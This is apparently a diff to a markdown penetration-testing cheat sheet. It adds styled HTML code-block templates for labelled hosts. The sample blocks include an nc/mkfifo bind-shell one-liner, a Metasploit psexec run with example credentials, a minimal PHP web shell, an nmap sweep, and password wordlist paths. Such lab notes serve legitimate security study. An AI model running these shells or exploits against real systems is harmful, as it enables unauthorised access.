@@ -15,11 +15,30 @@ This unholy scroll gathers essential one-liners and spectral commands — rites 
 
 List all IPv4 addresses with interface names (detailed)  
 
-```powershell
+<!-- POWERSHELL BLOCK -->
+<div style="border:1px solid #224;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#112;color:#C0C0C0;padding:4px 8px;font-size:13px;">
+    🔵 PowerShell
+  </div>
+  <div style="background:#012456;color:#C0C0C0;padding:10px;white-space:pre;overflow-x:auto;">
 Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
-```
+  </div>
+</div>
+<!-- END POWERSHELL BLOCK -->
 
 List interfaces with IPv4 addresses (filtered, concise)  
+
+<!-- BASH BLOCK -->
+<div style="border:1px solid #555;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#1b1b1b;color:#ddd;padding:4px 8px;font-size:13px;">
+    🐧 bash — <b>Linux</b>
+  </div>
+  <div style="background:#0a0a0a;color:#ccc;padding:10px;white-space:pre;overflow-x:auto;">
+<span style="color:#666;"># Description</span>
+ls -la
+  </div>
+</div>
+<!-- END BASH BLOCK -->
 
 ```powershell
 Get-NetIPConfiguration | Where-Object { $_.IPv4Address } | Select-Object InterfaceAlias, @{n='IPv4';e={$_.IPv4Address.IPAddress}}
@@ -405,6 +424,182 @@ SecLists
 /usr/share/wordlists/rockyou.txt
 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 ```
+
+</details>
+
+---
+
+<details>
+<summary><h2>📃 Code Templates</summary>
+
+| Prefix | Block | Theme | Comment Syntax |
+|--------|-------|-------|----------------|
+| `!ps` | PowerShell | Blue | `# ...` |
+| `!cmd` | CMD Windows | Black | `REM ...` |
+| `!bash` | Bash Linux | Gray | `# ...` |
+| `!basha` | Bash AttackHost | Green | `# ...` |
+| `!basht` | Bash Target | Blue | `# ...` |
+| `!bashp` | Bash Pivot | Orange | `# ...` |
+| `!msf` | Metasploit | Dark red | `# ...` |
+| `!js` | JavaScript | Yellow | `// ...` |
+| `!php` | PHP | Purple | `// ...` |
+| `!ruby` | Ruby | Red | `# ...` |
+| `!sql` | SQL | Cyan | `-- ...` |
+| `!py` | Python | Blue/Yellow | `# ...` |
+| `!txt` | Text/Output | Gray | *(none)* |
+| `!note` | Note | Yellow | *(none)* |
+
+<!-- POWERSHELL BLOCK -->
+<div style="border:1px solid #224;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#112;color:#C0C0C0;padding:4px 8px;font-size:13px;">
+    🔵 PowerShell — <b>WS01</b>
+  </div>
+  <div style="background:#012456;color:#C0C0C0;padding:10px;white-space:pre;overflow-x:auto;">
+Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
+  </div>
+</div>
+<!-- END POWERSHELL BLOCK -->
+
+<!-- CMD BLOCK -->
+<div style="border:1px solid #333;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#222;color:#fff;padding:4px 8px;font-size:13px;">
+    🪟 CMD — <b>DC01</b>
+  </div>
+  <div style="background:#000;color:#fff;padding:10px;white-space:pre;overflow-x:auto;">
+ipconfig /all
+  </div>
+</div>
+<!-- END CMD BLOCK -->
+
+<!-- BASH BLOCK -->
+<div style="border:1px solid #3344aa;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#001233;color:#aaccff;padding:4px 8px;font-size:13px;">
+    🐧 bash — <b>Target</b>
+  </div>
+  <div style="background:#000b1a;color:#cce0ff;padding:10px;white-space:pre;overflow-x:auto;">
+<span style="color:#666;"># Runs an nmap scan to discover ip addresses</span>
+sudo nmap 10.129.2.0/24 -sn | grep for | cut -d" " -f5
+  </div>
+</div>
+<!-- END BASH BLOCK -->
+
+<!-- BASH BLOCK -->
+<div style="border:1px solid #3a3;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#0b270b;color:#9f9;padding:4px 8px;font-size:13px;">
+    🐧 bash — <b>AttackHost</b>
+  </div>
+  <div style="background:#001a00;color:#0f0;padding:10px;white-space:pre;overflow-x:auto;">
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
+  </div>
+</div>
+<!-- END BASH BLOCK -->
+
+<!-- BASH BLOCK -->
+<div style="border:1px solid #dd4814 ;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#611a00;color:#FFA500  ;padding:4px 8px;font-size:13px;">
+    🐧 bash — <b>Pivot</b>
+  </div>
+  <div style="background: #2a0b00ff;color:#ccc;padding:10px;white-space:pre;overflow-x:auto;">
+python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
+  </div>
+</div>
+<!-- END BASH BLOCK -->
+<!-- BASH BLOCK -->
+<div style="border:1px solid #555;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#1b1b1b;color:#ddd;padding:4px 8px;font-size:13px;">
+    🐧 bash — <b>Linux</b>
+  </div>
+  <div style="background:#0a0a0a;color:#ccc;padding:10px;white-space:pre;overflow-x:auto;">
+tree .
+  </div>
+</div>
+<!-- END BASH BLOCK -->
+
+<!-- METASPLOIT BLOCK -->
+<div style="border:1px solid #552222;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#330000;color:#ff6666;padding:4px 8px;font-size:13px;">
+    💀 Metasploit — <b>AttackHost</b>
+  </div>
+  <div style="background:#000;color:#f55;padding:10px;white-space:pre;overflow-x:auto;">
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS 10.10.10.5
+set SMBUser Administrator
+set SMBPass 'Summer2025!'
+run
+  </div>
+</div>
+<!-- END METASPLOIT BLOCK -->
+
+<!-- JAVASCRIPT BLOCK -->
+<div style="border:1px solid #444;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#222;color:#f7df1e;padding:4px 8px;font-size:13px;">
+    🟨 JavaScript — <b>PayloadGen</b>
+  </div>
+  <div style="background:#1a1a1a;color:#fce;padding:10px;white-space:pre;overflow-x:auto;">
+fetch("http://target/login", {
+  method: "POST",
+  body: JSON.stringify({user:"admin",pass:"admin"})
+});
+  </div>
+</div>
+<!-- END JAVASCRIPT BLOCK -->
+
+<!-- PHP BLOCK -->
+<div style="border:1px solid #335;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#2a2a55;color:#8899ff;padding:4px 8px;font-size:13px;">
+    🟦 PHP — <b>WebShell</b>
+  </div>
+  <div style="background:#111122;color:#ccf;padding:10px;white-space:pre;overflow-x:auto;">
+&lt;?php
+echo shell_exec("whoami");
+?&gt;
+  </div>
+</div>
+<!-- END PHP BLOCK -->
+
+<!-- RUBY BLOCK -->
+<div style="border:1px solid #500;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#300;color:#f44;padding:4px 8px;font-size:13px;">
+    ❤️ Ruby — <b>ExploitScript</b>
+  </div>
+  <div style="background:#1a0000;color:#fbb;padding:10px;white-space:pre;overflow-x:auto;">
+require 'socket'
+s = TCPSocket.new("10.10.10.5", 80)
+s.puts("GET / HTTP/1.1\r\nHost: test\r\n\r\n")
+puts s.read
+  </div>
+</div>
+<!-- END RUBY BLOCK -->
+
+<!-- SQL BLOCK -->
+<div style="border:1px solid #355;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#022;color:#8ff;padding:4px 8px;font-size:13px;">
+    🟩 SQL — <b>HR-DB</b>
+  </div>
+  <div style="background:#001b1b;color:#ccffff;padding:10px;white-space:pre;overflow-x:auto;">
+SELECT username, last_login
+FROM employees
+WHERE role = 'manager';
+  </div>
+</div>
+<!-- END SQL BLOCK -->
+
+<!-- TXT BLOCK -->
+<div style="border:1px solid #555;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
+  <div style="background:#444;color:#ddd;padding:4px 8px;font-size:13px;">
+    📄 Text — <b>ScanOutput</b>
+  </div>
+  <div style="background:#222;color:#eee;padding:10px;white-space:pre;overflow-x:auto;">
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+  </div>
+</div>
+<!-- END TXT BLOCK -->
+
+
 
 </details>
 
